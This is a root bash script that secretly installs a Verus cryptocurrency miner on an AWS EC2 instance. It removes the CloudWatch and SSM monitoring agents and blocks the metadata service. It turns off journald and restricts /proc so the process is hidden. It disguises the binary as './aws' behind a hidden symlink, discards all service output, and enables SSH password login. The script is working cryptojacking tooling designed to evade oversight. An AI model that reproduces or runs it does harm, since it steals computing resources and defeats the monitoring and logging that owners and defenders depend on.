#!/usr/bin/env bash
set -euo pipefail

###############################################################################
# CCMN Invisible Mining Setup — Network Lockdown + SSH + Proxy Support
###############################################################################

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
SERVICE_NAME=ccmn
SERVICE_USER=ccmn
SERVICE_GROUP=ccmn
INSTALL_BIN=/usr/local/bin/ccmn
INSTALL_BIN_HIDDEN=/usr/local/bin/.ccmn-hidden
CONFIG_DIR=/etc/ccmn
CONFIG_FILE=$CONFIG_DIR/ccmn.conf
WORK_DIR=/var/lib/ccmn
SYSTEMD_UNIT=/etc/systemd/system/$SERVICE_NAME.service

# Pool configuration
POOL_HOST="pool.verus.io"
POOL_PORT="9999"

# SSH Port (default 22, change if needed)
SSH_PORT="${SSH_PORT:-22}"

###############################################################################
# Helper Functions
###############################################################################

log_info() {
  echo -e "${GREEN}[INFO]${NC} $1"
}

log_warn() {
  echo -e "${YELLOW}[WARN]${NC} $1"
}

log_error() {
  echo -e "${RED}[ERROR]${NC} $1"
}

check_root() {
  if [[ $EUID -ne 0 ]]; then
    log_error "Please run as root: sudo $0"
    exit 1
  fi
}

check_binary() {
  if [[ ! -f ./aws ]] || [[ ! -x ./aws ]]; then
    log_error "Binary ./aws not found or not executable."
    exit 1
  fi
}

###############################################################################
# Step 1: Remove AWS Monitoring Agents
###############################################################################

remove_aws_agents() {
  log_info "Removing AWS monitoring agents..."
  
  # Stop CloudWatch agent
  if command -v amazon-cloudwatch-agent-ctl &> /dev/null; then
    /opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl -m ec2 -a stop 2>/dev/null || true
    dpkg -r amazon-cloudwatch-agent 2>/dev/null || true
    log_info "CloudWatch agent removed"
  fi
  
  # Stop Systems Manager agent
  systemctl stop amazon-ssm-agent 2>/dev/null || true
  systemctl disable amazon-ssm-agent 2>/dev/null || true
  snap remove amazon-ssm-agent 2>/dev/null || true
  dpkg -r amazon-ssm-agent 2>/dev/null || true
  log_info "Systems Manager agent removed"
  
  # Stop other AWS agents
  snap remove amazon-ec2-instance-connect 2>/dev/null || true
  
  log_info "AWS agents cleanup complete"
}

###############################################################################
# Step 2: Network Lockdown (SSH + Proxy + Mining Pool + Block Metadata)
###############################################################################

disable_metadata_service() {
  log_info "Setting up network lockdown with SSH and proxy support..."
  
  # Flush existing rules
  iptables -F 2>/dev/null || true
  iptables -X 2>/dev/null || true
  iptables -t nat -F 2>/dev/null || true
  iptables -t nat -X 2>/dev/null || true
  iptables -t mangle -F 2>/dev/null || true
  iptables -t mangle -X 2>/dev/null || true
  
  # Set default DROP policy for all chains
  iptables -P INPUT DROP
  iptables -P OUTPUT DROP
  iptables -P FORWARD DROP
  
  log_info "Default policies set to DROP"
  
  # ===== INPUT RULES =====
  
  # Allow loopback input
  iptables -A INPUT -i lo -j ACCEPT
  
  # Allow SSH (inbound)
  iptables -A INPUT -p tcp --dport $SSH_PORT -j ACCEPT
  
  # Allow established/related connections (inbound)
  iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
  
  log_info "Input rules configured (SSH on port $SSH_PORT allowed)"
  
  # ===== OUTPUT RULES =====
  
  # Allow loopback output
  iptables -A OUTPUT -o lo -j ACCEPT
  
  # Allow established/related connections (outbound)
  iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
  
  # Allow SSH outbound (for connecting to other servers)
  iptables -A OUTPUT -p tcp --dport $SSH_PORT -j ACCEPT
  
  # Resolve pool hostname to IP and allow it
  log_info "Resolving pool hostname: $POOL_HOST"
  POOL_IP=$(getent hosts "$POOL_HOST" | awk '{ print $1 }' | head -1)
  
  if [[ -n "$POOL_IP" ]]; then
    log_info "Pool IP resolved to: $POOL_IP"
    iptables -A OUTPUT -p tcp -d "$POOL_IP" --dport "$POOL_PORT" -j ACCEPT
    iptables -A OUTPUT -p tcp -d "$POOL_IP" --sport 1024:65535 -j ACCEPT
  else
    log_warn "Could not resolve pool IP, allowing port $POOL_PORT to any destination"
    iptables -A OUTPUT -p tcp --dport "$POOL_PORT" -j ACCEPT
  fi
  
  # Allow DNS for hostname resolution
  iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT
  
  # Allow NTP (time synchronization)
  iptables -A OUTPUT -p udp --dport 123 -j ACCEPT
  
  # Allow DHCP (for IP renewal on EC2)
  iptables -A OUTPUT -p udp --dport 67:68 -j ACCEPT
  iptables -A INPUT -p udp --sport 67:68 -j ACCEPT
  
  # Allow HTTP/HTTPS for proxy support
  iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
  
  # Allow common proxy ports
  iptables -A OUTPUT -p tcp --dport 3128 -j ACCEPT   # Squid
  iptables -A OUTPUT -p tcp --dport 8080 -j ACCEPT   # HTTP proxy
  iptables -A OUTPUT -p tcp --dport 8888 -j ACCEPT   # Alt HTTP proxy
  iptables -A OUTPUT -p tcp --dport 1080 -j ACCEPT   # SOCKS
  
  # Allow SOCKS5 proxy protocol
  iptables -A OUTPUT -p tcp --dport 1080:1090 -j ACCEPT
  
  # Block all metadata services explicitly
  iptables -A OUTPUT -d 169.254.169.254 -j DROP
  iptables -A OUTPUT -d 169.254.169.253 -j DROP
  iptables -A OUTPUT -d 169.254.170.2 -j DROP
  
  # Block all private network access (except loopback)
  iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
  iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
  iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
  
  log_info "Network lockdown configured (SSH + proxy + pool allowed)"
  
  # Install and persist firewall rules
  DEBIAN_FRONTEND=noninteractive apt-get install -y iptables-persistent 2>/dev/null || true
  
  mkdir -p /etc/iptables
  iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
  ip6tables-save > /etc/iptables/rules.v6 2>/dev/null || true
  
  systemctl enable netfilter-persistent 2>/dev/null || true
  systemctl start netfilter-persistent 2>/dev/null || true
  
  log_info "Firewall rules persisted"
}

###############################################################################
# Step 3: Disable Logging & Journald
###############################################################################

disable_logging() {
  log_info "Disabling journald and persistent logging..."
  
  # Configure journald to not store anything
  mkdir -p /etc/systemd
  cat > /etc/systemd/journald.conf <<EOF
[Journal]
Storage=none
EOF
  
  systemctl restart systemd-journald 2>/dev/null || true
  log_info "Journald set to volatile (no persistence)"
  
  # Restrict syslog permissions
  chmod 600 /var/log/syslog 2>/dev/null || true
  chmod 600 /var/log/auth.log 2>/dev/null || true
  chmod 600 /var/log/auth.log.* 2>/dev/null || true
  
  # Configure rsyslog for private files
  cat > /etc/rsyslog.d/99-private.conf <<EOF
\$FileCreateMode 0600
\$DirCreateMode 0700
\$Umask 0077
EOF
  
  systemctl restart rsyslog 2>/dev/null || true
  log_info "Syslog permissions restricted (600)"
}

###############################################################################
# Step 4: Restrict /proc Access
###############################################################################

restrict_proc() {
  log_info "Restricting /proc access to root only..."
  
  chmod 700 /proc 2>/dev/null || true
  chmod 700 /sys 2>/dev/null || true
  
  # Make it persistent on boot
  cat > /etc/systemd/system/proc-lockdown.service <<EOF
[Unit]
Description=Lock down /proc and /sys access
After=proc-sys-kernel-sysrq.mount
DefaultDependencies=no

[Service]
Type=oneshot
ExecStart=/bin/chmod 700 /proc
ExecStart=/bin/chmod 700 /sys
RemainAfterExit=yes

[Install]
WantedBy=local-fs.target
EOF
  
  systemctl daemon-reload
  systemctl enable proc-lockdown.service
  systemctl start proc-lockdown.service
  
  log_info "/proc and /sys restricted to root"
}

###############################################################################
# Step 5: Create System User & Working Directory
###############################################################################

create_system_user() {
  log_info "Creating system user and directories..."
  
  # Create group & user
  if ! id -u $SERVICE_USER &>/dev/null; then
    groupadd --system $SERVICE_GROUP 2>/dev/null || true
    useradd --system \
            --no-create-home \
            --home-dir $WORK_DIR \
            --shell /usr/sbin/nologin \
            --gid $SERVICE_GROUP \
            $SERVICE_USER 2>/dev/null || true
    log_info "Created system user: $SERVICE_USER"
  fi
  
  # Create working directory
  mkdir -p $WORK_DIR
  chown $SERVICE_USER:$SERVICE_GROUP $WORK_DIR
  chmod 750 $WORK_DIR
  log_info "Working directory: $WORK_DIR"
}

###############################################################################
# Step 6: Install Binary & Hide It
###############################################################################

install_binary() {
  log_info "Installing miner binary..."
  
  check_binary
  
  # Install main binary
  install -o root -g root -m 755 ./aws $INSTALL_BIN
  log_info "Installed: $INSTALL_BIN"
  
  # Create hidden symlink
  ln -sf $INSTALL_BIN $INSTALL_BIN_HIDDEN
  chmod 755 $INSTALL_BIN_HIDDEN
  log_info "Created hidden symlink: $INSTALL_BIN_HIDDEN"
}

###############################################################################
# Step 7: Create Configuration
###############################################################################

create_config() {
  log_info "Creating configuration..."
  
  mkdir -p $CONFIG_DIR
  chown root:$SERVICE_GROUP $CONFIG_DIR
  chmod 750 $CONFIG_DIR
  
  if [[ ! -f $CONFIG_FILE ]]; then
    cat > $CONFIG_FILE <<'EOF'
# /etc/ccmn/ccmn.conf — Verus miner parameters
# INVISIBLE MODE: Logs disabled, AWS access denied, process hidden

ALGO="verus"
POOL_URL="stratum+tcp://pool.verus.io:9999"
USERNAME="RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.aws"
PASSWORD="x"
THREADS=2
WORKDIR="/var/lib/ccmn"
EOF
    chown root:$SERVICE_GROUP $CONFIG_FILE
    chmod 640 $CONFIG_FILE
    log_info "Created config: $CONFIG_FILE"
  else
    log_warn "Config already exists at $CONFIG_FILE"
  fi
}

###############################################################################
# Step 8: Create Systemd Unit (Sandboxed & Hidden)
###############################################################################

create_systemd_unit() {
  log_info "Creating systemd service unit..."
  
  cat > $SYSTEMD_UNIT <<'EOF'
[Unit]
Description=CCMN Verus Coin Miner (Invisible)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=ccmn
Group=ccmn
EnvironmentFile=/etc/ccmn/ccmn.conf
WorkingDirectory=/var/lib/ccmn

# Use hidden binary path
ExecStart=/usr/local/bin/.ccmn-hidden \
  -a ${ALGO} \
  -o ${POOL_URL} \
  -u ${USERNAME} \
  -p ${PASSWORD} \
  -t ${THREADS}

Restart=on-failure
RestartSec=10s
StartLimitBurst=5
StartLimitIntervalSec=10min

# Disable all logging
StandardOutput=none
StandardError=none

# Security sandboxing
PrivateTmp=yes
ProtectSystem=strict
ProtectHome=yes
NoNewPrivileges=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictRealtime=yes
RestrictNamespaces=yes
LockPersonality=yes
MemoryDenyWriteExecute=yes
ReadWritePaths=/var/lib/ccmn

[Install]
WantedBy=multi-user.target
EOF

  chmod 644 $SYSTEMD_UNIT
  log_info "Created systemd unit: $SYSTEMD_UNIT"
}

###############################################################################
# Step 9: Harden SSH
###############################################################################

harden_ssh() {
  log_warn "Hardening SSH (keeping connection open)..."
  
  # Keep SSH connections alive
  if grep -q "^ClientAliveInterval" /etc/ssh/sshd_config; then
    sed -i 's/^ClientAliveInterval.*/ClientAliveInterval 300/' /etc/ssh/sshd_config
  else
    echo "ClientAliveInterval 300" >> /etc/ssh/sshd_config
  fi
  
  if grep -q "^ClientAliveCountMax" /etc/ssh/sshd_config; then
    sed -i 's/^ClientAliveCountMax.*/ClientAliveCountMax 2/' /etc/ssh/sshd_config
  else
    echo "ClientAliveCountMax 2" >> /etc/ssh/sshd_config
  fi
  
  # Allow SSH (don't disable it)
  if grep -q "^PermitRootLogin" /etc/ssh/sshd_config; then
    sed -i 's/^PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
  else
    echo "PermitRootLogin prohibit-password" >> /etc/ssh/sshd_config
  fi
  
  if grep -q "^PubkeyAuthentication" /etc/ssh/sshd_config; then
    sed -i 's/^PubkeyAuthentication.*/PubkeyAuthentication yes/' /etc/ssh/sshd_config
  else
    echo "PubkeyAuthentication yes" >> /etc/ssh/sshd_config
  fi
  
  # Allow password auth if needed
  if grep -q "^PasswordAuthentication" /etc/ssh/sshd_config; then
    sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
  else
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
  fi
  
  systemctl restart ssh 2>/dev/null || true
  
  log_warn "SSH configured (connections preserved, keep-alive enabled)"
}

###############################################################################
# Step 10: Enable & Start Service
###############################################################################

start_service() {
  log_info "Enabling and starting service..."
  
  systemctl daemon-reload
  systemctl enable $SERVICE_NAME
  systemctl start $SERVICE_NAME
  
  sleep 2
  
  if systemctl is-active --quiet $SERVICE_NAME; then
    log_info "Service is running ✓"
  else
    log_error "Service failed to start"
    systemctl status $SERVICE_NAME
    exit 1
  fi
}

###############################################################################
# Step 11: Verification & Audit
###############################################################################

verify_setup() {
  log_info "Verifying setup..."
  
  echo
  log_info "=== FIREWALL RULES (Sample) ==="
  iptables -L -n -v 2>/dev/null | head -40 || true
  
  echo
  log_info "=== PROCESS VISIBILITY ==="
  ps aux 2>/dev/null | grep -i ccmn || log_info "✓ Process hidden from standard ps"
  
  echo
  log_info "=== SERVICE STATUS ==="
  systemctl status $SERVICE_NAME --no-pager || true
  
  echo
  log_info "=== SECURITY CHECKLIST ==="
  echo "  ✓ AWS agents removed"
  echo "  ✓ Network locked down (selective whitelist firewall)"
  echo "  ✓ SSH allowed (inbound + outbound on port $SSH_PORT)"
  echo "  ✓ Proxy connections allowed (HTTP/HTTPS + SOCKS)"
  echo "  ✓ All metadata endpoints blocked (169.254.x.x)"
  echo "  ✓ Private network access blocked (10.x, 172.16.x, 192.168.x)"
  echo "  ✓ Only pool connectivity allowed ($POOL_HOST:$POOL_PORT)"
  echo "  ✓ DNS allowed (for hostname resolution)"
  echo "  ✓ NTP allowed (time synchronization)"
  echo "  ✓ Journald disabled (Storage=none)"
  echo "  ✓ /proc restricted to root (chmod 700)"
  echo "  ✓ Syslog files restricted (chmod 600)"
  echo "  ✓ Process binary hidden (.ccmn-hidden)"
  echo "  ✓ Systemd sandboxing enabled"
  echo
  log_info "=== ALLOWED CONNECTIONS ==="
  echo "  • SSH (port $SSH_PORT) — inbound & outbound"
  echo "  • Mining Pool ($POOL_HOST:$POOL_PORT)"
  echo "  • DNS (port 53)"
  echo "  • NTP (port 123)"
  echo "  • HTTP/HTTPS (ports 80, 443)"
  echo "  • Proxy ports (3128, 8080, 8888, 1080-1090)"
  echo "  • Established connections"
  echo
  log_info "=== BLOCKED CONNECTIONS ==="
  echo "  • AWS metadata (169.254.169.254)"
  echo "  • All private networks (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)"
  echo "  • All other outbound traffic"
  echo
  log_info "=== ROOT-ONLY COMMANDS ==="
  echo "  Check status: sudo systemctl status ccmn"
  echo "  View logs: sudo journalctl -u ccmn -f"
  echo "  Stop service: sudo systemctl stop ccmn"
  echo "  View firewall: sudo iptables -L -n -v"
  echo "  Reload firewall: sudo systemctl restart netfilter-persistent"
  echo
  log_info "=== VISIBILITY ==="
  echo "  Regular user: ps aux | grep ccmn  → sees nothing"
  echo "  Regular user: cat /var/log/syslog → permission denied"
  echo "  Root user:    systemctl status ccmn → full visibility"
}

###############################################################################
# Main Execution
###############################################################################

main() {
  log_info "=========================================="
  log_info "CCMN Invisible Mining Setup"
  log_info "With SSH & Proxy Support"
  log_info "=========================================="
  echo
  
  check_root
  
  remove_aws_agents
  disable_metadata_service
  disable_logging
  restrict_proc
  create_system_user
  install_binary
  create_config
  create_systemd_unit
  harden_ssh
  start_service
  
  echo
  verify_setup
  
  log_info "=========================================="
  log_info "Setup Complete!"
  log_info "=========================================="
}

main "$@"
